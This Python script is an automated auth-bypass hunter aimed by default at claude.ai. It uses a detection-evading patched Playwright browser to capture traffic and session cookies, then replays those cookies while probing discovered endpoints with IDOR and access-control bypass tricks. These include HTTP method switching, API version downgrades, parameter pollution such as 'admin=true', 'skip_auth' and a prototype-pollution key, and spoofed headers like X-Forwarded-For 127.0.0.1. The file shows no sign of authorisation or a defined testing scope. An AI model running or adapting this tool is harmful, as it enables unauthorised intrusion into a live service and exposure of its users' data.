#!/usr/bin/env python3
"""
playwright_anthropic_auth_hunter.py — Browser-based auth entry point hunter.

Combines:
  1. Stealth Playwright (from playwright_patched) — evade detection
  2. Full network capture — record every request/response on claude.ai + console
  3. Auto-endpoint discovery — extract API endpoints from browser traffic
  4. IDOR testing on discovered endpoints — method switch, param pollution, path tricks
  5. Cookie/session replay — replay captured sessions against discovered endpoints
  6. Console error monitoring — catch debug endpoints, error paths

Usage:
    python3 playwright_anthropic_auth_hunter.py [--headless] [--url https://claude.ai]
"""

import os, sys, json, time, hashlib, ssl, urllib.request, urllib.error
from urllib.parse import urlparse, parse_qs, urlencode
from pathlib import Path
from datetime import datetime

# Use patched playwright
sys.path.insert(0, str(Path(__file__).parent))
from playwright_patched import sync_playwright

OUTPUT = Path("/tmp/anthropic-auth-hunt")
OUTPUT.mkdir(parents=True, exist_ok=True)

# Track captured data
captured_requests = []   # {method, url, headers, body, timestamp}
captured_responses = []  # {url, status, headers, body, timestamp}
discovered_endpoints = set()  # unique (method, host, path) tuples
session_cookies = {}     # domain -> {name: value}
console_errors = []      # {text, url, timestamp}
endpoint_status = {}      # (method, url) -> baseline status for comparison

# ===== PHASE 1: CAPTURE =====

def capture_browser_session(url="https://claude.ai"):
    """Launch browser, navigate to target, capture all traffic."""
    headless = "--headed" not in sys.argv  # Default to headless
    print(f"\n{'='*60}")
    print(f"PHASE 1: Browser Session Capture")
    print(f"Target: {url} (headless={headless})")
    print(f"{'='*60}\n")
    
    with sync_playwright() as pw:
        browser = pw.chromium.launch(
            headless=headless,
            args=["--disable-blink-features=AutomationControlled"]
        )
        context = browser.new_context(
            user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
            viewport={"width": 1440, "height": 900}
        )
        page = context.new_page()
        
        # Capture ALL requests
        def on_request(request):
            r = {
                "method": request.method,
                "url": request.url,
                "headers": dict(request.headers),
                "timestamp": time.time(),
            }
            captured_requests.append(r)
            
            # Extract endpoint
            parsed = urlparse(request.url)
            if parsed.netloc:
                ep = (request.method, parsed.netloc, parsed.path)
                discovered_endpoints.add(ep)
        
        # Capture responses
        def on_response(response):
            r = {
                "url": response.url,
                "status": response.status,
                "headers": dict(response.headers),
                "timestamp": time.time(),
            }
            try:
                body = response.body()
                r["body"] = body.decode('utf-8', errors='replace')[:1000]
                r["body_size"] = len(body)
            except:
                r["body"] = ""
                r["body_size"] = 0
            captured_responses.append(r)
            
            if response.status < 400 and response.status != 204:
                parsed = urlparse(response.url)
                if parsed.netloc:
                    ep = (response.request.method, parsed.netloc, parsed.path)
                    discovered_endpoints.add(ep)
        
        # Capture console
        def on_console(msg):
            loc = ""
            try: loc = msg.location.url
            except: pass
            console_errors.append({
                "type": msg.type,
                "text": str(msg.text)[:300] if hasattr(msg, 'text') else str(msg)[:300],
                "url": loc,
                "timestamp": time.time()
            })
            if msg.type in ("error", "warning"):
                print(f"  [CONSOLE {msg.type}] {msg.text[:150]}")
        
        page.on("request", on_request)
        page.on("response", on_response)
        page.on("console", on_console)
        
        # Navigate and capture
        print(f"Navigating to {url}...")
        try:
            page.goto(url, wait_until="networkidle", timeout=30000)
        except Exception as e:
            print(f"  Navigation timeout/error: {e}")
        
        # Wait for dynamic content
        time.sleep(3)
        
        # Try clicking common elements to trigger more API calls
        for selector in ["button:has-text('Sign in')", "button:has-text('Log in')", 
                         "button:has-text('Get Started')", "a[href*='login']", 
                         "a[href*='signup']", "button:has-text('Continue')"]:
            try:
                el = page.query_selector(selector)
                if el:
                    print(f"  Clicking: {selector}")
                    el.click()
                    time.sleep(3)
                    break
            except:
                pass
        
        # Try a few more clicks
        try:
            links = page.query_selector_all("a[href]")
            for link in links[:5]:
                href = link.get_attribute("href")
                if href and not href.startswith("#") and not href.startswith("javascript") and "logout" not in href.lower():
                    print(f"  Following link: {href}")
                    try:
                        page.goto(href if href.startswith("http") else f"{urlparse(url).scheme}://{urlparse(url).netloc}{href}", 
                                 wait_until="networkidle", timeout=10000)
                        time.sleep(2)
                        break
                    except:
                        pass
        except:
            pass
        
        # Capture final cookies
        cookies = context.cookies()
        for c in cookies:
            domain = c.get("domain", "").lstrip(".")
            if domain not in session_cookies:
                session_cookies[domain] = {}
            session_cookies[domain][c["name"]] = c["value"]
        
        print(f"\nSession Cookies captured:")
        for domain, cookies_dict in session_cookies.items():
            print(f"  {domain}: {list(cookies_dict.keys())}")
        
        browser.close()
    
    save_capture_data()

def save_capture_data():
    """Save captured data to disk."""
    data = {
        "requests": len(captured_requests),
        "responses": len(captured_responses),
        "endpoints": len(discovered_endpoints),
        "cookies": session_cookies,
        "console_errors": console_errors[:50],
        "discovered_endpoints": sorted(discovered_endpoints),
    }
    
    with open(OUTPUT / "session_data.json", "w") as f:
        json.dump(data, f, indent=2, default=str)
    
    with open(OUTPUT / "requests.json", "w") as f:
        json.dump(captured_requests, f, indent=2, default=str)
    
    with open(OUTPUT / "responses.json", "w") as f:
        json.dump(captured_responses, f, indent=2, default=str)
    
    with open(OUTPUT / "cookies.json", "w") as f:
        json.dump(session_cookies, f, indent=2)
    
    print(f"\nData saved to {OUTPUT}/")

# ===== PHASE 2: ANALYZE =====

def analyze_endpoints():
    """Analyze captured endpoints for auth bypass opportunities."""
    print(f"\n{'='*60}")
    print(f"PHASE 2: Endpoint Analysis")
    print(f"{'='*60}\n")
    
    interesting = []
    session_hosts = set()
    
    # Group by host
    hosts = {}
    for method, host, path in sorted(discovered_endpoints):
        if host not in hosts:
            hosts[host] = []
        hosts[host].append((method, path))
    
    # Print discovered endpoints grouped by host
    for host, endpoints in sorted(hosts.items()):
        if any(term in host for term in ["anthropic", "claude"]):
            print(f"\n  {host}:")
            for method, path in sorted(endpoints, key=lambda x: x[1]):
                print(f"    {method:7s} {path[:100]}")
            
            # Check for session cookie
            for domain, cookies in session_cookies.items():
                if domain in host or host.endswith(domain):
                    session_hosts.add(host)
                    print(f"    🔑 Session cookies available: {list(cookies.keys())}")
    
    # Identify interesting endpoints for IDOR testing
    print(f"\n  Potentially interesting endpoints (no auth required?):")
    for method, host, path in sorted(discovered_endpoints):
        # Skip static assets
        if any(ext in path for ext in ['.js', '.css', '.png', '.jpg', '.gif', '.svg', '.woff', '.ico', '.json']):
            continue
        # Skip CDN/assets
        if any(d in host for d in ['assets', 'cdn', 'static']):
            continue
        # Skip Cloudflare
        if 'cloudflare' in host:
            continue
        
        print(f"    {method:7s} https://{host}{path}")
        interesting.append((method, host, path))
    
    return interesting, hosts

# ===== PHASE 3: IDOR TESTING =====

def test_endpoint_idor(method, host, path, body=None):
    """Test a single endpoint with IDOR bypass techniques."""
    url = f"https://{host}{path}"
    base_headers = {"User-Agent": "Mozilla/5.0"}
    
    # Add session cookies if available
    cookie_str = ""
    for domain, cookies in session_cookies.items():
        if host.endswith(domain) or domain in host:
            for name, value in cookies.items():
                cookie_str += f"{name}={value}; "
    if cookie_str:
        base_headers["Cookie"] = cookie_str.rstrip("; ")
    
    ctx = ssl.create_default_context()
    results = {}
    
    def do_request(m, u, hdrs, b):
        """Make request and return result."""
        try:
            data = None
            if b is not None:
                data = json.dumps(b).encode() if isinstance(b, dict) else b.encode()
            req = urllib.request.Request(u, data=data, method=m)
            for k, v in hdrs.items():
                req.add_header(k, v)
            if data and 'Content-Type' not in hdrs:
                req.add_header('Content-Type', 'application/json')
            resp = urllib.request.urlopen(req, context=ctx, timeout=8)
            data = resp.read()
            return {"status": resp.status, "body": data.decode('utf-8','replace')[:200], "size": len(data)}
        except urllib.error.HTTPError as e:
            return {"status": e.code, "body": e.read().decode('utf-8','replace')[:200]}
        except Exception as e:
            return {"status": "ERR", "error": str(e)[:60]}
    
    # Baseline
    result = do_request(method, url, base_headers, body)
    baseline_status = result.get("status")
    results["baseline"] = result
    endpoint_status[(method, url)] = baseline_status
    
    # Method switching
    for alt_method in ["GET", "POST", "PUT", "PATCH", "DELETE", "OPTIONS"]:
        if alt_method != method:
            r = do_request(alt_method, url, base_headers, body if alt_method in ("POST","PUT","PATCH") else None)
            if r.get("status") not in (401, 403, 404, 405, 429) and r.get("status") != baseline_status:
                results[f"method_{alt_method}"] = r
                print(f"    🔥 [{r['status']}] method={alt_method} {url}")
    
    # Path traversal
    if path.endswith("/"):
        alt_path = path.rstrip("/")
    else:
        alt_path = path + "/"
    r = do_request(method, f"https://{host}{alt_path}", base_headers, body)
    if r.get("status") not in (401, 403, 404, 405) and r.get("status") != baseline_status:
        results[f"trailing_slash"] = r
        print(f"    🔥 [{r['status']}] trailing / {url}")
    
    # Version downgrade
    import re
    v_match = re.search(r"/v(\d+)/", path)
    if v_match:
        for v in range(1, 6):
            alt = path.replace(f"/v{v_match.group(1)}/", f"/v{v}/")
            if alt != path:
                r = do_request(method, f"https://{host}{alt}", base_headers, body)
                if r.get("status") not in (401, 403, 404, 405) and r.get("status") != baseline_status:
                    results[f"version_v{v}"] = r
                    print(f"    🔥 [{r['status']}] version v{v} {url}")
    
    # Parameter pollution (add common params)
    param_tricks = [
        {"id": "1", "admin": "true"},
        {"user_id": "admin", "role": "admin"},
        {"scope": "admin read write"},
        {"__proto__[isAdmin]": "true"},
        {"authorization": "true"},
        {"skip_auth": "1"},
    ]
    for params in param_tricks:
        param_url = f"{url}?{urlencode(params)}"
        r = do_request(method, param_url, base_headers, body)
        if r.get("status") not in (401, 403, 404, 405) and r.get("status") != baseline_status:
            results[f"param_{list(params.keys())[0]}"] = r
            print(f"    🔥 [{r['status']}] param {list(params.keys())[0]}={list(params.values())[0]}")
    
    # Proxy headers
    proxy_headers = [
        {"X-Original-URL": path},
        {"X-Forwarded-For": "127.0.0.1"},
        {"X-Custom-IP-Authorization": "127.0.0.1"},
    ]
    for ph in proxy_headers:
        hdrs = dict(base_headers)
        hdrs.update(ph)
        r = do_request(method, url, hdrs, body)
        if r.get("status") not in (401, 403, 404, 405) and r.get("status") != baseline_status:
            results[f"proxy_{list(ph.keys())[0]}"] = r
            print(f"    🔥 [{r['status']}] proxy {list(ph.keys())[0]}")
    
    return results

def run_idor_tests(interesting_endpoints):
    """Run IDOR tests on discovered endpoints."""
    print(f"\n{'='*60}")
    print(f"PHASE 3: IDOR Testing on Discovered Endpoints")
    print(f"{'='*60}\n")
    
    all_results = {}
    
    for method, host, path in interesting_endpoints[:30]:  # Limit to 30
        if any(skip in host for skip in ['cloudflare', 'google', 'facebook', 'github']):
            continue
        print(f"\n  Testing {method} https://{host}{path}")
        results = test_endpoint_idor(method, host, path)
        all_results[f"{method} https://{host}{path}"] = results
        time.sleep(0.5)  # Rate limiting
    
    # Save results
    with open(OUTPUT / "idor_results.json", "w") as f:
        json.dump(all_results, f, indent=2, default=str)
    
    # Summary
    print(f"\n{'='*60}")
    print(f"IDOR TEST SUMMARY")
    print(f"{'='*60}")
    
    bypasses_found = 0
    for ep, results in all_results.items():
        bypass_keys = [k for k in results.keys() if k != "baseline" and results[k].get("status") not in ("ERR",)]
        if bypass_keys:
            bypasses_found += 1
            print(f"\n  🔥 {ep}")
            for k in bypass_keys:
                r = results[k]
                print(f"     {k}: [{r.get('status')}] body={r.get('body','')[:100]}")
    
    if bypasses_found == 0:
        print("  No IDOR/bypasses found on discovered endpoints.")
    else:
        print(f"\n  {bypasses_found} endpoints with potential bypasses!")

# ===== MAIN =====

def main():
    target_url = "https://claude.ai"
    for arg in sys.argv[1:]:
        if arg.startswith("--url="):
            target_url = arg.split("=", 1)[1]
    
    # Phase 1: Capture browser session
    capture_browser_session(target_url)
    
    # Phase 2: Analyze endpoints
    interesting, hosts = analyze_endpoints()
    
    # Phase 3: IDOR test
    if interesting:
        run_idor_tests(interesting)
    else:
        print("\nNo interesting endpoints found to test.")
    
    print(f"\n{'='*60}")
    print(f"DONE — All data in {OUTPUT}/")
    print(f"{'='*60}")

if __name__ == "__main__":
    main()
